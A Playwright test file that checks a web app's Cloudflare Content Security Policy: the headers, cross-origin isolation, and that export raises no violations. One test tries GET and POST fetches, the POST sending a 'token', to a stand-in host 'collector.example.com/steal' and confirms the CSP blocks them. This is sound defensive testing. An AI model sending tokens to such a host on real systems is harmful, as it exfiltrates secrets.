import { readFileSync } from 'node:fs'
import { resolve } from 'node:path'
import type { Page } from '@playwright/test'
import { expect, test } from './fixtures/coverage'
import { exportToDone, openFixture, useOpfsFolder } from './fixtures/siteExport'

// publish-credentials-core PM3: the Cloudflare `_headers` CSP. Vite preview does
// not read `public/_headers`, so every same-origin response gets the file's
// headers here; other origins answer 200 with open CORS, so a fetch that fails
// can only have been blocked by the CSP.

const R2_URL =
  'https://0123456789abcdef0123456789abcdef.r2.cloudflarestorage.com/my-books/_photobooks/check-0a1b2c3d.txt'
const OTHER_URL = 'https://collector.example.com/steal'

function fileHeaders(): Record<string, string> {
  const text = readFileSync(resolve(process.cwd(), 'public/_headers'), 'utf8')
  return Object.fromEntries(
    text
      .split('\n')
      .slice(1)
      .map((line) => /^\s+([A-Za-z-]+):\s*(.+)$/.exec(line))
      .filter((match) => match !== null)
      .map(([, name = '', value = '']) => [name.toLowerCase(), value.trim()]),
  )
}

const HEADERS = fileHeaders()

interface Violations {
  console: string[]
  events: string[]
}

async function serveWithFileHeaders(page: Page): Promise<Violations> {
  const violations: Violations = { console: [], events: [] }
  page.on('console', (message) => {
    const text = message.text()
    if (/Content Security Policy/i.test(text)) violations.console.push(text)
  })
  await page.exposeFunction('__cspViolation', (text: string) => {
    violations.events.push(text)
  })
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (event) => {
      const report = (
        window as unknown as {
          __cspViolation: (text: string) => Promise<void>
        }
      ).__cspViolation
      void report(`${event.effectiveDirective} ${event.blockedURI}`)
    })
  })
  const { origin } = new URL(test.info().project.use.baseURL ?? '')
  await page.route('**/*', async (route) => {
    const url = new URL(route.request().url())
    if (url.origin !== origin) {
      await route.fulfill({
        status: 200,
        headers: { 'access-control-allow-origin': '*' },
        body: 'ok',
      })
      return
    }
    const response = await route.fetch()
    await route.fulfill({
      response,
      headers: { ...response.headers(), ...HEADERS },
    })
  })
  return violations
}

test('_headers declares the connect-src limit', () => {
  expect(HEADERS['content-security-policy']).toBe(
    "connect-src 'self' https://*.r2.cloudflarestorage.com; script-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
  )
  expect(HEADERS['cross-origin-embedder-policy']).toBe('credentialless')
})

test('the app loads under the CSP with no violation and stays isolated', async ({
  page,
}) => {
  const violations = await serveWithFileHeaders(page)

  const response = await page.goto('/')
  await expect(page.getByTestId('welcome-screen')).toBeVisible({
    timeout: 15_000,
  })

  expect(response?.headers()['content-security-policy']).toBe(
    HEADERS['content-security-policy'],
  )
  expect(await page.evaluate(() => window.crossOriginIsolated)).toBe(true)
  expect(violations).toEqual({ console: [], events: [] })
})

test('the painter editor exports a site under the CSP with no violation', async ({
  page,
}) => {
  const violations = await serveWithFileHeaders(page)

  await openFixture(page)
  await useOpfsFolder(page, 'csp-export')
  await exportToDone(page, true)

  expect(violations).toEqual({ console: [], events: [] })
})

test('a fetch to another origin is blocked, one to R2 is not', async ({
  page,
}) => {
  const violations = await serveWithFileHeaders(page)
  await page.goto('/')
  await expect(page.getByTestId('welcome-screen')).toBeVisible({
    timeout: 15_000,
  })

  const results = await page.evaluate(
    async ({ other, r2 }) => {
      const attempt = (url: string, init?: RequestInit) =>
        fetch(url, init).then(
          async (response) =>
            `${String(response.status)} ${await response.text()}`,
          (error: unknown) => `blocked ${String(error)}`,
        )
      return {
        other: await attempt(other),
        otherPost: await attempt(other, { method: 'POST', body: 'token' }),
        r2: await attempt(r2),
      }
    },
    { other: OTHER_URL, r2: R2_URL },
  )

  expect(results.other).toMatch(/^blocked TypeError/)
  expect(results.otherPost).toMatch(/^blocked TypeError/)
  expect(results.r2).toBe('200 ok')
  await expect
    .poll(() => violations.events)
    .toEqual([`connect-src ${OTHER_URL}`, `connect-src ${OTHER_URL}`])
})
